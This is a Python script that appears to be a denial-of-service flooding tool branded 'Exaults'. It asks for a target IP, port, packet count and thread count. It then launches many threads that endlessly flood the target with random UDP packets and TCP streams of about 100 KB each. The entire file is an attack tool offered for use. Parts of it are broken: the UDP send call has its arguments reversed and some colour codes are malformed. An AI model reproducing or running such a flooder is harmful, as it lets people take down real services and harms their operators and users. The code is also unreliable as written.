import time
import socket
import random
import threading
import os,sys

os.system("clear")

print("""\033[31;1m
███████╗██╗░░██╗░█████╗░██╗░░░██╗██╗░░░░░████████╗░██████╗  ██████╗░██████╗░███████╗░██████╗███████╗███╗░░██╗████████╗
██╔════╝╚██╗██╔╝██╔══██╗██║░░░██║██║░░░░░╚══██╔══╝██╔════╝  ██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝████╗░██║╚══██╔══╝
█████╗░░░╚███╔╝░███████║██║░░░██║██║░░░░░░░░██║░░░╚█████╗░  ██████╔╝██████╔╝█████╗░░╚█████╗░█████╗░░██╔██╗██║░░░██║░░░
██╔══╝░░░██╔██╗░██╔══██║██║░░░██║██║░░░░░░░░██║░░░░╚═══██╗  ██╔═══╝░██╔══██╗██╔══╝░░░╚═══██╗██╔══╝░░██║╚████║░░░██║░░░
███████╗██╔╝╚██╗██║░░██║╚██████╔╝███████╗░░░██║░░░██████╔╝  ██║░░░░░██║░░██║███████╗██████╔╝███████╗██║░╚███║░░░██║░░░
╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚══════╝░░░╚═╝░░░╚═════╝░  ╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═════╝░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░
""")
ip = str(input("Ip Hosting: "))
port = int(input("Port Hosting: "))
choice = str(input("Attacking? (y/n): "))
times = int(input("Packets: "))
threads = int(input("Threads: "))
os.system("clear")
def ext1():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext2():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext3():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext4():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def tcp1():
  data = random._urandom(102498)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def tcp2():
  data = random._urandom(102498)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def tcp3():
  data = random._urandom(102498)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def tcp4():
  data = random._urandom(102498)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def tcp5():
  data = random._urandom(102498)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

for y in range(threads):
  if choice == "y":
    th = threading.Thread(target = ext1)
    th.start()
    th = threading.Thread(target = ext2)
    th.start()
    th = threading.Thread(target = ext3)
    th.start()
    th = threading.Thread(target = ext4)
    th.start()
    th = threading.Thread(target = tcp1)
    th.start()
    th = threading.Thread(target = tcp2)
    th.start()
    th = threading.Thread(target = tcp3)
    th.start()
    th = threading.Thread(target = tcp4)
    th.start()
    th = threading.Thread(target = tcp5)
    th.start()